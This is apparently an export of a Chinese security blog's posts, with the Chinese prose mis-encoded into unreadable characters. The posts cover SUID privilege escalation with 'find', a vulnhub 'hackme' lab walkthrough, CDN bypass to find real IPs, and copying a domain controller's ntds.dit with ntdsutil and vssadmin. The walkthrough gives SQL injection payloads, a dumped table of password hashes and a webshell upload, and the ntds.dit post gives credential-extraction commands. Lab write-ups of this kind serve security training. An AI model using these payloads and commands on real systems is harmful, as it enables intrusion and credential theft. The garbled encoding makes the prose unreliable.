<p>é»˜è®¤æƒ…å†µæ˜¯1ï¼Œä¹Ÿå°±æ˜¯ç­‰åŒäº1&gt;/dev/null 2&gt;&amp;1ã€‚æ„æ€å°±æ˜¯æŠŠæ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°â€œé»‘æ´â€ï¼Œè¿˜æŠŠé”™è¯¯è¾“å‡º2é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º1ï¼Œä¹Ÿå°±æ˜¯æ ‡å‡†è¾“å‡ºå’Œé”™è¯¯è¾“å‡ºéƒ½è¿›äº†â€œé»‘æ´â€<br><code>2&gt;&amp;1 &gt;/dev/null</code><br>æ„æ€å°±æ˜¯æŠŠé”™è¯¯è¾“å‡º2é‡å®šå‘åˆ°æ ‡å‡†å‡ºä¹¦1ï¼Œä¹Ÿå°±æ˜¯å±å¹•ï¼Œæ ‡å‡†è¾“å‡ºè¿›äº†â€œé»‘æ´â€ï¼Œä¹Ÿå°±æ˜¯æ ‡å‡†è¾“å‡ºè¿›äº†é»‘æ´ï¼Œé”™è¯¯è¾“å‡ºæ‰“å°åˆ°å±å¹•</p>
<h3 id="Linuxä¸‹çš„æƒé™"><a href="#Linuxä¸‹çš„æƒé™" class="headerlink" title="Linuxä¸‹çš„æƒé™"></a>Linuxä¸‹çš„æƒé™</h3><p>Linuxä¸‹æƒé™çš„å±ç»„æœ‰ æ‹¥æœ‰è€… ã€ç¾¤ç»„ ã€å…¶å®ƒç»„ ä¸‰ç§ï¼Œè®¾ç½®ä¸åŒçš„rwxæƒé™ã€‚</p>
<p>Linuxä¸‹æ–‡ä»¶çš„æƒé™ç±»å‹ä¸€èˆ¬åŒ…æ‹¬è¯»ï¼Œå†™ï¼Œæ‰§è¡Œï¼Œå³rï¼Œwï¼Œxã€‚</p>
<blockquote>
<p>r=4ï¼Œw=2ï¼Œx=1<br>rwx = 4 + 2 + 1 = 7<br>rw = 4 + 2 = 6<br>rx = 4 +1 = 5</p>
</blockquote>
<p>ä¸€èˆ¬è¡¨ç¤ºä¸€ä¸ªæ–‡ä»¶æ‰€æœ‰æƒé™è¯¦æƒ…çš„æœ‰ä¸¤ç§æ–¹å¼</p>
<p>ä¸€ç§æ˜¯åè¿›åˆ¶ï¼Œåè¿›åˆ¶çš„å¸¸ç”¨è¡¨ç¤ºå½¢å¼</p>
<blockquote>
<p>-rwâ€”â€”- (600)    åªæœ‰æ‹¥æœ‰è€…æœ‰è¯»å†™æƒé™ã€‚<br>-rw-râ€“râ€“ (644)    åªæœ‰æ‹¥æœ‰è€…æœ‰è¯»å†™æƒé™ï¼›è€Œå±ç»„ç”¨æˆ·å’Œå…¶ä»–ç”¨æˆ·åªæœ‰è¯»æƒé™ã€‚<br>-rwxâ€”â€” (700)    åªæœ‰æ‹¥æœ‰è€…æœ‰è¯»ã€å†™ã€æ‰§è¡Œæƒé™ã€‚<br>-rwxr-xr-x (755)    æ‹¥æœ‰è€…æœ‰è¯»ã€å†™ã€æ‰§è¡Œæƒé™ï¼›è€Œå±ç»„ç”¨æˆ·å’Œå…¶ä»–ç”¨æˆ·åªæœ‰è¯»ã€æ‰§è¡Œæƒé™ã€‚<br>-rwxâ€“xâ€“x (711)    æ‹¥æœ‰è€…æœ‰è¯»ã€å†™ã€æ‰§è¡Œæƒé™ï¼›è€Œå±ç»„ç”¨æˆ·å’Œå…¶ä»–ç”¨æˆ·åªæœ‰æ‰§è¡Œæƒé™ã€‚<br>-rw-rw-rw- (666)    æ‰€æœ‰ç”¨æˆ·éƒ½æœ‰æ–‡ä»¶è¯»ã€å†™æƒé™ã€‚<br>-rwxrwxrwx (777)    æ‰€æœ‰ç”¨æˆ·éƒ½æœ‰è¯»ã€å†™ã€æ‰§è¡Œæƒé™ã€‚</p>
</blockquote>
<p>å¦ä¸€ç§æ˜¯åäºŒè¿›åˆ¶</p>
<p>linuxé™¤äº†è®¾ç½®æ­£å¸¸çš„è¯»å†™æ“ä½œæƒé™å¤–ï¼Œè¿˜æœ‰å…³äºä¸€ç±»è®¾ç½®ä¹Ÿæ˜¯æ¶‰åŠåˆ°æƒé™ï¼Œå«åšLinxué™„åŠ æƒé™ã€‚åŒ…æ‹¬ SETä½æƒé™ï¼ˆsuidï¼Œsgidï¼‰å’Œç²˜æ»ä½æƒé™ï¼ˆstickyï¼‰</p>
<p>sæƒé™(SetUIDï¼ŒSetGID)</p>
<p>SetUID    åªèƒ½åº”ç”¨äºäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶*</p>
<p>SetGID    å¯åº”ç”¨äºäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶*å’Œç›®å½•</p>
<p>4ä»£è¡¨SetUIDï¼Œ2ä»£è¡¨SetGIDï¼Œ6åˆ™æ˜¯ä¸¤è€…éƒ½ç½®ä½</p>
<p><code>chmod 4777 xxx</code></p>
<p><code>chmod 2777 xxx</code></p>
<p><code>chmod 6777 xxx</code></p>
<p><code>chmod </code></p>
<br>

<h3 id="findææƒ"><a href="#findææƒ" class="headerlink" title="findææƒ"></a>findææƒ</h3><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://blog.csdn.net/weixin_45596239/article/details/102844386">https://blog.csdn.net/weixin_45596239/article/details/102844386</a><br><a href="https://blog.csdn.net/weixin_44912169/article/details/105845909">https://blog.csdn.net/weixin_44912169/article/details/105845909</a><br><a href="https://blog.csdn.net/gramdog/article/details/80374119">https://blog.csdn.net/gramdog/article/details/80374119</a><br><a href="https://gtfobins.github.io/gtfobins/find/">https://gtfobins.github.io/gtfobins/find/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>ææƒ</category>
      </categories>
      <tags>
        <tag>ææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub-hackmeé¶æœº</title>
    <url>/posts/9f82d7d9/</url>
    <content><![CDATA[<p>å°±ç®€å•å†™å†™æ€è·¯ï¼Œæœ€è¿‘å¼€å§‹å®ä¹ äº†ï¼Œä¹Ÿæ²¡å¤šå°‘æ—¶é—´å»å†™è¿™ç§é¶åœºçš„ç¬”è®°äº†</p>
<h3 id="è·å–é¶æœºip"><a href="#è·å–é¶æœºip" class="headerlink" title="è·å–é¶æœºip"></a>è·å–é¶æœºip</h3><p><code>arp-scan -l</code> è·å–é¶æœºçš„ip ä¸º 192.168.0.198</p>
<h3 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h3><p><code>nmap -sV 192.168.0.198</code></p>
<p>å¼€æ”¾äº†22 80ç«¯å£</p>
<h3 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h3><p>ä½¿ç”¨dirsearchæ‰«æç›®å½•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">39:05] 200 -    0B  - &#x2F;config.php                                          </span><br><span class="line">[17:39:07] 200 -  100B  - &#x2F;index.php                                                         </span><br><span class="line">[17:39:07] 200 -  100B  - &#x2F;index.php&#x2F;login&#x2F;</span><br><span class="line">[17:39:08] 200 -    1KB - &#x2F;login.php                                                       </span><br><span class="line">[17:39:08] 302 -    0B  - &#x2F;logout.php  -&gt;  login.php</span><br><span class="line">[17:39:10] 200 -    2KB - &#x2F;register.php                                                     </span><br><span class="line">[17:39:10] 403 -  302B  - &#x2F;server-status&#x2F;                                              </span><br><span class="line">[17:39:10] 403 -  301B  - &#x2F;server-status</span><br><span class="line">[17:39:11] 301 -  316B  - &#x2F;uploads  -&gt;  http:&#x2F;&#x2F;192.168.0.198&#x2F;uploads&#x2F;                     </span><br><span class="line">[17:39:11] 200 -  940B  - &#x2F;uploads&#x2F;                     </span><br><span class="line">                                         </span><br></pre></td></tr></table></figure>

<p>è®¿é—®ä¸‹ <code>/uploads</code> çœ‹åˆ°é‡Œé¢å†…å®¹ä¸ºä¸Šä¼ </p>
<h3 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h3><p>è®¿é—®ä¸‹80ç«¯å£ï¼Œæ˜¯ä¸€ä¸ªæ³¨å†Œç™»å½•æ¡†</p>
<p>æ³¨å†Œåç™»å½• æœ‰ä¸€ä¸ªæœç´¢åŠŸèƒ½ï¼Œæµ‹è¯•äº†ä¸‹å‘ç°æœ‰sqlæ³¨å…¥</p>
<p><code>a&#39; or 1=1 #</code>  è¿™é‡Œ<code>--+ </code>ä¸å¯ä»¥ï¼Œ<code>-- </code> å¯ä»¥</p>
<p>ä½¿ç”¨order by æ²¡æœ‰å›æ˜¾</p>
<p>ç›´æ¥ä½¿ç”¨union select è¯•ä¸‹æœ‰å‡ ä¸ªå­—æ®µ</p>
<p><code>a&#39; union select 1,2,3-- a</code> å‘ç°æœ‰ä¸‰ä¸ªå­—æ®µ</p>
<p><code>a%27+union+select+version%28%29%2Cdatabase%28%29%2C@@datadir--+a</code></p>
<p>åˆ†åˆ«å¾—åˆ° <code>5.7.25-0ubuntu0.18.10.2  </code> <code> webapphacking</code> <code> /var/lib/mysql/ SG</code></p>
<p><code>a&#39; union SELECT table_name,2,3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE();-- </code></p>
<p>å¾—åˆ°<code>users</code> å’Œ <code>books</code>ä¸¤ä¸ªè¡¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Database: webapphacking</span><br><span class="line">Table: users</span><br><span class="line">[5 columns]</span><br><span class="line">+---------+----------------------+</span><br><span class="line">| Column  | Type                 |</span><br><span class="line">+---------+----------------------+</span><br><span class="line">| user    | varchar(30)          |</span><br><span class="line">| address | varchar(50)          |</span><br><span class="line">| id      | smallint(5) unsigned |</span><br><span class="line">| name    | varchar(30)          |</span><br><span class="line">| pasword | varchar(70)          |</span><br><span class="line">+---------+----------------------+</span><br></pre></td></tr></table></figure>

<p>   dumpå¾—åˆ°è´¦æˆ·å¯†ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">superDatabase: webapphacking</span><br><span class="line">Table: users</span><br><span class="line">[7 entries]</span><br><span class="line">+----+--------------+------------+----------------+---------------------------------------------+</span><br><span class="line">| id | name         | user       | address        | pasword                                     |</span><br><span class="line">+----+--------------+------------+----------------+---------------------------------------------+</span><br><span class="line">| 1  | David        | user1      | Newton Circles | 5d41402abc4b2a76b9719d911017c592 (hello)    |</span><br><span class="line">| 2  | Beckham      | user2      | Kensington     | 6269c4f71a55b24bad0f0267d9be5508 (commando) |</span><br><span class="line">| 3  | anonymous    | user3      | anonymous      | 0f359740bd1cda994f8b55330c86d845 (p@ssw0rd) |</span><br><span class="line">| 10 | testismyname | test       | testaddress    | 05a671c66aefea124cc08b76ea6d30bb (testtest) |</span><br><span class="line">| 11 | superadmin   | superadmin | superadmin     | 2386acb2cf356944177746fc92523983            |</span><br><span class="line">| 12 | test1        | test1      | test1          | 05a671c66aefea124cc08b76ea6d30bb (testtest) |</span><br><span class="line">| 13 | testtest     | testtest   | testtest       | 05a671c66aefea124cc08b76ea6d30bb (testtest) |</span><br><span class="line">+----+--------------+------------+----------------+---------------------------------------------+</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™æ¡superadminçš„å¯†ç  sqlmapæ²¡æœ‰è§£å‡ºæ¥  </p>
<p><a href="https://crackstation.net/">https://crackstation.net/</a> å¯ä»¥è¿›è¡Œç ´è§£ æœ€ç»ˆå¾—åˆ°å¯†ç ä¸º <code>Uncrackable</code>(ç”¨å›½å†…çš„æ²¡è§£å‡ºæ¥)</p>
<p>ä½¿ç”¨superadminè¿›è¡Œç™»å½•ï¼Œç™»é™†åå‘ç°æœ‰ä¸€ä¸ªä¸Šä¼ åŠŸèƒ½</p>
<h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>ä½¿ç”¨èšå‰‘ç›´æ¥ç”Ÿæˆshell.phpä¸Šä¼ å°±å¯ä»¥è¿æ¥ï¼Œè¿™é‡Œæ²¡æœ‰åšé˜²æŠ¤</p>
<p>å¾—åˆ°www-dataæƒé™</p>
<p><code>cat /etc/passwd</code></p>
<p>åé¢å‘ç°ä¸»æœºä¸Šæœ‰ä¸¤ä¸ªç”¨æˆ· åˆ†åˆ«ä¸º<code>hackme</code> å’Œ<code> legacy</code></p>
<p>åœ¨legacyç›®å½•ä¸‹å­˜åœ¨ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ è¿è¡Œåå‘ç°æ²¡ååº”ï¼Œåç»­çœ‹äº†ä¸‹æœ€åæ˜¯é€šè¿‡è¿™ä¸ªæ–‡ä»¶è¿›è¡Œææƒçš„ï¼Œä½†æ˜¯åœ¨è¿™é‡Œå´ç”¨ä¸äº†ï¼Œç”¨ä¸äº†å°±ç®—äº†ï¼Œè¿™ä¸ªé¶æœºè¿˜æ˜¯æ¯”è¾ƒç®€å•ï¼Œå°±ä¸€ä¸ªsqlæ³¨å…¥ï¼Œæœ€è¿‘ä¸€ç›´åœ¨å®ä¹ ï¼Œä¹Ÿæ²¡ä»€ä¹ˆæ—¶é—´ï¼Œå‘¨æœ«æœ‰æ—¶é—´çš„è¯å°±çœ‹çœ‹æ–‡ç« ï¼Œå¤ç°ä¸‹æ¼æ´ï¼Œæ‰“æ‰“é¶åœºå•¥çš„ï¼Œå¼Ÿå¼Ÿå¤ªèœäº†ï¼ŒåŠªåŠ›å‘€ï¼</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>CDNç»•è¿‡æŸ¥æ‰¾çœŸå®IP</title>
    <url>/posts/619fb955/</url>
    <content><![CDATA[<h3 id="é¦–å…ˆè¦éªŒè¯ç½‘ç«™æ˜¯å¦å­˜åœ¨CDN"><a href="#é¦–å…ˆè¦éªŒè¯ç½‘ç«™æ˜¯å¦å­˜åœ¨CDN" class="headerlink" title="é¦–å…ˆè¦éªŒè¯ç½‘ç«™æ˜¯å¦å­˜åœ¨CDN"></a>é¦–å…ˆè¦éªŒè¯ç½‘ç«™æ˜¯å¦å­˜åœ¨CDN</h3><h4 id="ä¸€èˆ¬å¯ä»¥é€šè¿‡å¤šåœ°ping-çœ‹å¯¹åº”çš„IPæ˜¯å¦å”¯ä¸€"><a href="#ä¸€èˆ¬å¯ä»¥é€šè¿‡å¤šåœ°ping-çœ‹å¯¹åº”çš„IPæ˜¯å¦å”¯ä¸€" class="headerlink" title="ä¸€èˆ¬å¯ä»¥é€šè¿‡å¤šåœ°ping çœ‹å¯¹åº”çš„IPæ˜¯å¦å”¯ä¸€"></a>ä¸€èˆ¬å¯ä»¥é€šè¿‡å¤šåœ°ping çœ‹å¯¹åº”çš„IPæ˜¯å¦å”¯ä¸€</h4><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a><br><a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></p>
<h3 id="ç»•è¿‡CDNæŸ¥çœŸå®IP"><a href="#ç»•è¿‡CDNæŸ¥çœŸå®IP" class="headerlink" title="ç»•è¿‡CDNæŸ¥çœŸå®IP"></a>ç»•è¿‡CDNæŸ¥çœŸå®IP</h3><h4 id="æŸ¥å†å²CDNè®°å½•"><a href="#æŸ¥å†å²CDNè®°å½•" class="headerlink" title="æŸ¥å†å²CDNè®°å½•"></a>æŸ¥å†å²CDNè®°å½•</h4><p><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a> æŸ¥è¯¢DNS</p>
<p><a href="https://sitereport.netcraft.com/?url=">https://sitereport.netcraft.com/?url=</a> </p>
<p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p>
<h4 id="æŸ¥è¯¢å­åŸŸå"><a href="#æŸ¥è¯¢å­åŸŸå" class="headerlink" title="æŸ¥è¯¢å­åŸŸå"></a>æŸ¥è¯¢å­åŸŸå</h4><p>æœ‰äº›ç½‘ç«™å¯èƒ½åªä¼šå¯¹ä¸»ç«™æˆ–éƒ¨åˆ†å¤§æµé‡å­ç«™åšCDNï¼Œè€Œå¾ˆå¤šå°ç«™æˆ–è€…å­ç«™åˆšå¥½åˆå’Œä¸»ç«™åœ¨åŒä¸€å°æœåŠ¡å™¨æˆ–è€…åŒä¸€ä¸ªCç«¯ä¸­ï¼Œå°±å¯ä»¥é€šè¿‡æŸ¥æ‰¾å­åŸŸåæ¥å¯»æ‰¾çœŸå®ip</p>
<h5 id="åœ¨çº¿å­åŸŸåæœºå™¨"><a href="#åœ¨çº¿å­åŸŸåæœºå™¨" class="headerlink" title="åœ¨çº¿å­åŸŸåæœºå™¨"></a>åœ¨çº¿å­åŸŸåæœºå™¨</h5><p><code>https://dnsdb.io/zh-cn/</code> è¾“å…¥ baidu.com type:A å°±å¯ä»¥æœé›†å…¶å­åŸŸåå’Œip</p>
<h5 id="googleè¯­æ³•"><a href="#googleè¯­æ³•" class="headerlink" title="googleè¯­æ³•"></a>googleè¯­æ³•</h5><p><code>site:baidu.com -www</code>  å¯ä»¥æŸ¥çœ‹æ’é™¤wwwçš„å­åŸŸå</p>
<h5 id="å­åŸŸåæ‰«æå™¨"><a href="#å­åŸŸåæ‰«æå™¨" class="headerlink" title="å­åŸŸåæ‰«æå™¨"></a>å­åŸŸåæ‰«æå™¨</h5><ul>
<li>layerå­åŸŸåæŒ–æ˜æœº</li>
<li>lijiejieçš„subdomainbrute</li>
</ul>
<h4 id="ä½¿ç”¨Fofa-shodan-zoomeye"><a href="#ä½¿ç”¨Fofa-shodan-zoomeye" class="headerlink" title="ä½¿ç”¨Fofa shodan zoomeye"></a>ä½¿ç”¨Fofa shodan zoomeye</h4><p>ä¸€èˆ¬å¸¸ç”¨Fofa å¯ä»¥é€šè¿‡ title body  ip ç­‰è¯­æ³•è¿›è¡ŒæŸ¥è¯¢</p>
<h4 id="åˆ©ç”¨SSLè¯ä¹¦å¯»æ‰¾çœŸå®IP"><a href="#åˆ©ç”¨SSLè¯ä¹¦å¯»æ‰¾çœŸå®IP" class="headerlink" title="åˆ©ç”¨SSLè¯ä¹¦å¯»æ‰¾çœŸå®IP"></a>åˆ©ç”¨SSLè¯ä¹¦å¯»æ‰¾çœŸå®IP</h4><p>å¯ä»¥ä½¿ç”¨ <code>https://censys.io/</code> è¿›è¡ŒæŸ¥è¯¢</p>
<h4 id="é€šè¿‡icon-hashæŸ¥ip"><a href="#é€šè¿‡icon-hashæŸ¥ip" class="headerlink" title="é€šè¿‡icon hashæŸ¥ip"></a>é€šè¿‡icon hashæŸ¥ip</h4><p>ä¸€èˆ¬å…ˆå°† favicon.ico ä¿å­˜åˆ°æœ¬åœ°ï¼Œç„¶åä¸Šä¼ åˆ°fofaä¸Šå³å¯</p>
<h4 id="ä½¿ç”¨å›½å¤–ä¸»æœºè§£æåŸŸå"><a href="#ä½¿ç”¨å›½å¤–ä¸»æœºè§£æåŸŸå" class="headerlink" title="ä½¿ç”¨å›½å¤–ä¸»æœºè§£æåŸŸå"></a>ä½¿ç”¨å›½å¤–ä¸»æœºè§£æåŸŸå</h4><p>æœ‰äº›å›½å†…çš„CDNå‚å¯èƒ½åªåšäº†å›½å†…çº¿è·¯ï¼Œè€Œé’ˆå¯¹å›½å¤–çš„çº¿è·¯å¯èƒ½å‡ ä¹æ²¡æœ‰ï¼Œæ‰€ä»¥å°è¯•ä½¿ç”¨å›½å¤–çš„ä¸»æœºå»è®¿é—®å¯èƒ½ä¼šå¾—åˆ°çœŸå®ip</p>
<h4 id="é€šè¿‡ç½‘ç«™æ¼æ´æŸ¥æ‰¾çœŸå®ip"><a href="#é€šè¿‡ç½‘ç«™æ¼æ´æŸ¥æ‰¾çœŸå®ip" class="headerlink" title="é€šè¿‡ç½‘ç«™æ¼æ´æŸ¥æ‰¾çœŸå®ip"></a>é€šè¿‡ç½‘ç«™æ¼æ´æŸ¥æ‰¾çœŸå®ip</h4><p>å¯ä»¥é€šè¿‡phpinfoä¹‹ç±»çš„æ¢é’ˆï¼Œxss. ssrf, å‘½ä»¤æ‰§è¡Œåå¼¹shell æºç æ³„æ¼ æ•æ„Ÿä¿¡æ¯æ³„æ¼ä¹‹ç±»</p>
<h4 id="F5-LTMè§£ç æ³•ï¼ˆè¿˜æ²¡å°è¯•è¿‡ï¼ŒæŠ½æ—¶é—´æµ‹è¯•ä¸‹ï¼‰"><a href="#F5-LTMè§£ç æ³•ï¼ˆè¿˜æ²¡å°è¯•è¿‡ï¼ŒæŠ½æ—¶é—´æµ‹è¯•ä¸‹ï¼‰" class="headerlink" title="F5 LTMè§£ç æ³•ï¼ˆè¿˜æ²¡å°è¯•è¿‡ï¼ŒæŠ½æ—¶é—´æµ‹è¯•ä¸‹ï¼‰"></a>F5 LTMè§£ç æ³•ï¼ˆè¿˜æ²¡å°è¯•è¿‡ï¼ŒæŠ½æ—¶é—´æµ‹è¯•ä¸‹ï¼‰</h4><p>å½“æœåŠ¡å™¨ä½¿ç”¨F5 LTMåšè´Ÿè½½å‡è¡¡æ—¶ï¼Œé€šè¿‡å¯¹set-cookieå…³é”®å­—çš„è§£ç çœŸå®ipä¹Ÿå¯è¢«è·å–ï¼Œä¾‹å¦‚ï¼šSet-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000ï¼Œå…ˆæŠŠç¬¬ä¸€å°èŠ‚çš„åè¿›åˆ¶æ•°å³487098378å–å‡ºæ¥ï¼Œç„¶åå°†å…¶è½¬ä¸ºåå…­è¿›åˆ¶æ•°1d08880aï¼Œæ¥ç€ä»åè‡³å‰ï¼Œä»¥æ­¤å–å››ä½æ•°å‡ºæ¥ï¼Œä¹Ÿå°±æ˜¯0a.88.08.1dï¼Œæœ€åä¾æ¬¡æŠŠä»–ä»¬è½¬ä¸ºåè¿›åˆ¶æ•°10.136.8.29ï¼Œä¹Ÿå°±æ˜¯æœ€åçš„çœŸå®ipã€‚</p>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://www.cnblogs.com/qiudabai/p/9763739.html">https://www.cnblogs.com/qiudabai/p/9763739.html</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/33440472">https://zhuanlan.zhihu.com/p/33440472</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>ntds.ditå¯¼å‡ºåŠè§£æ</title>
    <url>/posts/77c245ea/</url>
    <content><![CDATA[<h3 id="æå–ntds-dit"><a href="#æå–ntds-dit" class="headerlink" title="æå–ntds.dit"></a>æå–ntds.dit</h3><h4 id="ä½¿ç”¨ntdsutil-å·¥å…·æå–"><a href="#ä½¿ç”¨ntdsutil-å·¥å…·æå–" class="headerlink" title="ä½¿ç”¨ntdsutil å·¥å…·æå–"></a>ä½¿ç”¨ntdsutil å·¥å…·æå–</h4><p>ntdsutil.exeæ˜¯ä¸€ä¸ªä¸ºæ´»åŠ¨ç›®å½•æä¾›ç®¡ç†æœºåˆ¶çš„å‘½ä»¤è¡Œå·¥å…·ã€‚ä½¿ç”¨ntdsutil.exeå¯ä»¥ç»´æŠ¤å’Œç®¡ç†äº’åŠ¨ç›®å½•æ•°æ®åº“ã€æ§åˆ¶å•ä¸ªä¸»æœºæ“ä½œã€åˆ›å»ºåº”ç”¨ç¨‹åºç›®å½•åˆ†åŒºã€åˆ é™¤ç”±æœªä½¿ç”¨æ´»åŠ¨ç›®å½•å®‰è£…å‘å¯¼ï¼ˆDCPRome.exeï¼‰æˆåŠŸé™çº§çš„åŸŸæ§åˆ¶å™¨ç•™ä¸‹çš„å…ƒæ•°æ®ç­‰ã€‚è¯¥å·¥å…·é»˜è®¤å®‰è£…åœ¨åŸŸæ§åˆ¶å™¨ä¸Šï¼Œå¯ä»¥åœ¨åŸŸæ§åˆ¶å™¨ä¸Šç›´æ¥æ“ä½œï¼Œå¯ä»¥é€šè¿‡åŸŸå†…æœºå™¨åœ¨åŸŸæ§åˆ¶å™¨ä¸Šè¿œç¨‹æ“ä½œã€‚</p>
<p>ntdsutil.exe æ”¯æŒçš„æ“ä½œç³»ç»ŸåŒ…æ‹¬ Windows server 2003 ï¼ŒWindows server 2008ï¼ŒWindows server 2012</p>
<p> ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹</p>
<h5 id="åˆ›å»ºå¿«ç…§"><a href="#åˆ›å»ºå¿«ç…§" class="headerlink" title="åˆ›å»ºå¿«ç…§"></a>åˆ›å»ºå¿«ç…§</h5><p>è¯¥å¿«ç…§åŒ…å«windowsä¸­çš„æ‰€æœ‰æ–‡ä»¶ï¼Œä¸”åœ¨å¤åˆ¶æ–‡ä»¶æ—¶ä¸ä¼šå—åˆ°windowsé”å®šæœºåˆ¶çš„é™åˆ¶</p>
<p><code>ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</code></p>
<p>{}å†…ä¸ºå¿«ç…§çš„GUID</p>
<p><img src="/posts/77c245ea/ntdsutil_create_snapshot.png"></p>
<h5 id="æŒ‚è½½å¿«ç…§"><a href="#æŒ‚è½½å¿«ç…§" class="headerlink" title="æŒ‚è½½å¿«ç…§"></a>æŒ‚è½½å¿«ç…§</h5><p><code>ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit</code></p>
<p><img src="/posts/77c245ea/ntdsutil_load_snapshot.png"></p>
<h5 id="æ‹·è´å¿«ç…§"><a href="#æ‹·è´å¿«ç…§" class="headerlink" title="æ‹·è´å¿«ç…§"></a>æ‹·è´å¿«ç…§</h5><p>ä½¿ç”¨windowsè‡ªå¸¦çš„copyå‘½ä»¤å°†å¿«ç…§ä¸­çš„æ–‡ä»¶å¤åˆ¶å‡ºæ¥,å°†å¿«ç…§ä¸­çš„<code>C:\$SNAP_202107122344_VOLUMEC$\windows\ntds\ntds.dit</code>å¤åˆ¶åˆ°æœ¬åœ°è®¡ç®—æœºçš„ <code>C:\Users\Administrator\Desktop\</code> æ¡Œé¢ä¸Š</p>
<p><code>copy C:\$SNAP_202107122344_VOLUMEC$\windows\ntds\ntds.dit C:\Users\Administrator\Desktop\ntds.dit</code></p>
<p><img src="/posts/77c245ea/copy_ntds.png"></p>
<h5 id="å¸è½½å¹¶åˆ é™¤å¿«ç…§"><a href="#å¸è½½å¹¶åˆ é™¤å¿«ç…§" class="headerlink" title="å¸è½½å¹¶åˆ é™¤å¿«ç…§"></a>å¸è½½å¹¶åˆ é™¤å¿«ç…§</h5><p><code>ntdsutil snapshot &quot;unmout &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</code></p>
<p><img src="/posts/77c245ea/ntdsutil_delete_snapshot.png"></p>
<h5 id="æ£€æŸ¥å¿«ç…§æ˜¯å¦åˆ é™¤"><a href="#æ£€æŸ¥å¿«ç…§æ˜¯å¦åˆ é™¤" class="headerlink" title="æ£€æŸ¥å¿«ç…§æ˜¯å¦åˆ é™¤"></a>æ£€æŸ¥å¿«ç…§æ˜¯å¦åˆ é™¤</h5><p><code>ntdsutil snapshot &quot;List All&quot; quit quit</code></p>
<p><img src="/posts/77c245ea/ntdsutil_check_snapshot.png"></p>
<br>

<h4 id="åˆ©ç”¨vssadminæå–ntds-dit"><a href="#åˆ©ç”¨vssadminæå–ntds-dit" class="headerlink" title="åˆ©ç”¨vssadminæå–ntds.dit"></a>åˆ©ç”¨vssadminæå–ntds.dit</h4><p><code>vssadmin</code>æ˜¯Windowsä¸Šçš„ä¸€ä¸ªå·å½±æ‹·è´æœåŠ¡çš„å‘½ä»¤è¡Œç®¡ç†å·¥å…·ï¼Œå¯ç”¨äºåˆ›å»ºå’Œåˆ é™¤å·å½±æ‹·è´ã€åˆ—å‡ºå·å½±æ‹·è´çš„ä¿¡æ¯ï¼Œæ˜¾ç¤ºå·²å®‰è£…çš„æ‰€æœ‰å·å½±æ‹·è´å†™å…¥ç¨‹åºå’Œæä¾›ç¨‹åºï¼Œä»¥åŠæ”¹å˜å·å½±æ‹·è´çš„å­˜å‚¨ç©ºé—´çš„å¤§å°ç­‰ã€‚</p>
<p>é€‚ç”¨äº   Windows 10ï¼ŒWindows 8.1ï¼ŒWindows Server 2016ï¼ŒWindows Server 2012 R2ï¼ŒWindows Server 2012ï¼ŒWindows Server 2008 R2ï¼ŒWindows Server 2008</p>
<h5 id="åˆ›å»ºä¸€ä¸ªCç›˜çš„å·å½±æ‹·è´"><a href="#åˆ›å»ºä¸€ä¸ªCç›˜çš„å·å½±æ‹·è´" class="headerlink" title="åˆ›å»ºä¸€ä¸ªCç›˜çš„å·å½±æ‹·è´"></a>åˆ›å»ºä¸€ä¸ªCç›˜çš„å·å½±æ‹·è´</h5><p><code>vssadmin create shadow /for=c:</code></p>
<h5 id="å°†åˆ›å»ºçš„å·å½±æ‹·è´ä¸­çš„ntds-dit-copyåˆ°æ¡Œé¢"><a href="#å°†åˆ›å»ºçš„å·å½±æ‹·è´ä¸­çš„ntds-dit-copyåˆ°æ¡Œé¢" class="headerlink" title="å°†åˆ›å»ºçš„å·å½±æ‹·è´ä¸­çš„ntds.dit copyåˆ°æ¡Œé¢"></a>å°†åˆ›å»ºçš„å·å½±æ‹·è´ä¸­çš„ntds.dit copyåˆ°æ¡Œé¢</h5><p><code>copy \\?\CLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit c:\User\Administrator\Desktop ntds.dit</code></p>
